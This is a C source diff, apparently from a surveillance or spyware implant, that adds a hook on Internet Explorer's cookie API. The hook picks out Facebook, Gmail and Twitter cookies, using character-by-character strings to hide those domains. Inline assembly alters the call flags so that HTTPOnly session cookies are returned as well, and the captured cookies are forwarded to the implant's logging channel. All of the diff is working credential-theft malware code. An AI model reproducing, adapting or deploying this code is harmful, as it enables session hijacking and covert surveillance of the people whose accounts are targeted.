@@ -391,8 +391,130 @@ void GetURLBarContent(HWND hWnd, DWORD browser_type)
 }			
 
 
+
+typedef WCHAR * (WINAPI *StrStrW_t) (WCHAR *, WCHAR *);
+typedef struct {
+	COMMONDATA;
+	StrStrW_t pStrStrW;
+} InternetGetCookieExStruct;
+InternetGetCookieExStruct InternetGetCookieExData;
+
+#define WCSLEN(x,y) { y=0; for(;x[y];y++);}
+#define COOKIE_IEXPLORER 0x0F000000
+#define COOKIE_FACEBOOK 0x100
+#define COOKIE_TWITTER 0x200
+#define COOKIE_GMAIL 0x300
+#define COOKIE_MASK 0xFFFF
+BOOL __stdcall PM_InternetGetCookieEx(LPCWSTR lpszURL, LPCWSTR lpszCookieName, LPCWSTR lpszCookieData, LPDWORD lpdwSize, DWORD dwFlags, DWORD_PTR dwReserved)
+{
+	DWORD ret_code;
+	DWORD name_len;
+	DWORD origin;
+	DWORD old_flags;
+	DWORD old_size;
+	WCHAR facebook_url[] = { L'f', L'a', L'c', L'e', L'b', L'o', L'o', L'k', L'.', L'c', L'o', L'm', L'/', 0 };
+	WCHAR gmail_url[] = { L'm', L'a', L'i', L'l', L'.', L'g', L'o', L'o', L'g', L'l', L'e', L'.', L'c', L'o', L'm', L'/', 0 };
+	WCHAR twitter_url[] = { L't', L'w', L'i', L't', L't', L'e', L'r', L'.', L'c', L'o', L'm', L'/', 0 };
+
+	MARK_HOOK
+	INIT_WRAPPER(InternetGetCookieExStruct)
+
+	// Cerca di capire se si tratta di un dominio interessante
+	origin = COOKIE_IEXPLORER;
+	if (pData->pStrStrW && lpszCookieData && lpszURL) {
+		if (pData->pStrStrW((WCHAR *)lpszURL, facebook_url))
+			origin |= COOKIE_FACEBOOK;
+		else if (pData->pStrStrW((WCHAR *)lpszURL, gmail_url))
+			origin |= COOKIE_GMAIL;
+		else if (pData->pStrStrW((WCHAR *)lpszURL, twitter_url))
+			origin |= COOKIE_TWITTER;
+	}
+	if (!(origin & COOKIE_MASK)) {
+		CALL_ORIGINAL_API_SEQ(6)
+		return ret_code;
+	}
+
+	// Modifica il flag per prendere i cookie HTTPOnly
+	__asm {
+		PUSH EAX
+		MOV EAX, DWORD PTR [EBP+0x18]
+		MOV [old_flags], EAX
+		MOV EAX, DWORD PTR [EBP+0x14]
+		MOV [old_size], EAX
+		MOV EAX, 0x00002000
+		MOV DWORD PTR [EBP+0x18], EAX
+		POP EAX
+	}
+
+	CALL_ORIGINAL_API_SEQ(6)
+
+	if (ret_code) {
+		WCSLEN(lpszCookieData, name_len);
+		pData->pHM_IpcCliWrite(PM_URLLOG, (BYTE *)lpszCookieData, (name_len+1)*sizeof(WCHAR), origin, IPC_DEF_PRIORITY);
+	}
+
+	// Rimette i parametri originali e richiama la funzione
+	__asm {
+		PUSH EAX
+		MOV EAX, [old_size]
+		MOV DWORD PTR [EBP+0x14], EAX
+		MOV EAX, [old_flags]
+		MOV DWORD PTR [EBP+0x18], EAX
+		POP EAX
+	}
+	CALL_ORIGINAL_API_SEQ(6)
+	return ret_code;
+}
+
+DWORD PM_InternetGetCookieEx_setup(HMServiceStruct *pData)
+{
+	char proc_path[DLLNAMELEN];
+	char *proc_name;
+	HMODULE hMod;
+
+	ZeroMemory(proc_path, sizeof(proc_path));
+	FNC(GetModuleFileNameA)(NULL, proc_path, sizeof(proc_path)-1);
+	proc_name = strrchr(proc_path, '\\');
+	if (proc_name) {
+		proc_name++;
+		if (stricmp(proc_name, "iexplore.exe"))
+			return 1; // Hooka solo iexplorer
+	} else
+		return 1;
+
+	VALIDPTR(hMod = LoadLibrary("Shlwapi.dll"))
+	VALIDPTR(InternetGetCookieExData.pStrStrW = (StrStrW_t) HM_SafeGetProcAddress(hMod, "StrStrW"))
+
+	InternetGetCookieExData.pHM_IpcCliRead = pData->pHM_IpcCliRead;
+	InternetGetCookieExData.pHM_IpcCliWrite = pData->pHM_IpcCliWrite;
+	InternetGetCookieExData.dwHookLen = 990;
+	return 0;
+}
+
+
 DWORD __stdcall PM_UrlLogDispatch(BYTE * msg, DWORD dwLen, DWORD dwFlags, FILETIME *dummy)
 {
+	// XXX
+	// Test che vadano intanto gli URL di explorer e degli altri browser
+	// Testo con e senza ricordati di me su tutti e 3 i social network
+
+	DWORD origin = COOKIE_MASK;
+	origin = dwFlags & (~origin);
+	if (origin == COOKIE_IEXPLORER) {
+		origin = dwFlags & COOKIE_MASK;
+		if (origin == COOKIE_FACEBOOK) {
+			OutputDebugStringW(L"Cookie FACEBOOK:");
+			OutputDebugStringW((WCHAR *)msg);
+		} else if (origin == COOKIE_TWITTER) {
+			OutputDebugStringW(L"Cookie TWITTER:");
+			OutputDebugStringW((WCHAR *)msg);
+		} else if (origin == COOKIE_GMAIL) {
+			OutputDebugStringW(L"Cookie GMAIL:");
+			OutputDebugStringW((WCHAR *)msg);
+		} 
+		return 1;
+	}
+
 	GetURLBarContent(*((HWND *)msg), dwFlags);		
 	return 1;
 }
